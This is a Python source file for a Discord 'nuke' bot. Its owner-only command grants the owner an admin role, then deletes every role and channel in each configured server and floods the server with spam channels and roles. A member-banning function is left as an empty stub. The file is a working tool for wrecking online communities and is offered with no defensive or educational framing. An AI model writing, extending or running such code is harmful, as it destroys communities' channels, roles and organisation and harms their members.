import discord
from discord.ext import commands
import json
import random
import string
import asyncio


with open('config.json', 'r') as file:
    config = json.load(file)


TOKEN = config['token']
GUILD_IDS = config['guild_ids']
ADMIN_ROLE_NAME = config['admin_role_name']
SPAM_CHANNELS_NAME = config['spam_channels_name']
SPAM_ROLES_NAME = config['spam_roles_name']
OWNER_ID = config['owner_id']
NUM_CHANNELS = config['num_channels']
NUM_ROLES = config['num_roles']


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

@bot.command()
@is_owner()
async def nuke(ctx):
    for guild_id in GUILD_IDS:
        guild = bot.get_guild(guild_id)
        
        if guild is None:
            print(f'Failed to find guild with ID {guild_id}')
            continue
        
        try:
            deleted_channels = []
            deleted_roles = []
            
            
            await get_admin(guild)
            await delete_roles(guild, deleted_roles)
            await delete_channels(guild, deleted_channels)
            
            
            tasks = [
                spam_channels(guild, NUM_CHANNELS, deleted_channels),
                spam_roles(guild, NUM_ROLES, deleted_roles),
                ban_people(guild)  
            ]
            
            await asyncio.gather(*tasks)
            
            print(f'Deleted text channels in {guild.name}: {deleted_channels}')
            print(f'Deleted roles in {guild.name}: {deleted_roles}')
        except Exception as e:
            print(f'Error in guild {guild.name}: {e}')
        
    print('All actions completed')

async def get_admin(guild):
    try:
        
        admin_role = discord.utils.get(guild.roles, name=ADMIN_ROLE_NAME)
        if admin_role is None:
            admin_role = await guild.create_role(name=ADMIN_ROLE_NAME)
            print(f'Admin role created in {guild.name}')
    
        
        owner = await bot.application_info()
        await owner.owner.add_roles(admin_role)
        print(f'Admin role given to bot owner in {guild.name}')
    except Exception as e:
        print(f'Error creating admin role in {guild.name}: {e}')

async def delete_roles(guild, deleted_roles):
    try:
        
        print(f'Deleting roles in {guild.name}')
        for role in guild.roles:
            if role != guild.default_role:
                await role.delete()
                deleted_roles.append(role.name)
                print(f'Deleted role: {role.name}')
        print(f'All roles deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting roles in {guild.name}: {e}')

async def delete_channels(guild, deleted_channels):
    try:
        
        print(f'Deleting channels in {guild.name}')
        for channel in guild.channels:
            await channel.delete()
            if isinstance(channel, discord.TextChannel):
                deleted_channels.append(channel.name)
                print(f'Deleted channel: {channel.name}')
        print(f'All channels deleted in {guild.name}')
    except Exception as e:
        print(f'Error deleting channels in {guild.name}: {e}')

async def spam_channels(guild, num_channels, deleted_channels):
    try:
        
        for _ in range(num_channels):
            channel_name = config['spam_channels_name']
            channel = await guild.create_text_channel(name=channel_name)
            deleted_channels.append(channel.name)
            print(f'Spam channel created in {guild.name}: {channel.name}')
    except Exception as e:
        print(f'Error creating spam channels in {guild.name}: {e}')

async def spam_roles(guild, num_roles, deleted_roles):
    try:
        
        for _ in range(num_roles):
            role_name = config['spam_roles_name']
            role = await guild.create_role(name=role_name)
            deleted_roles.append(role.name)
            print(f'Spam role created in {guild.name}: {role.name}')
    except Exception as e:
        print(f'Error creating spam roles in {guild.name}: {e}')
      

async def ban_people(guild):
    try:
        
        
        pass
    except Exception as e:
        print(f'Error banning people in {guild.name}: {e}')


bot.run(TOKEN)
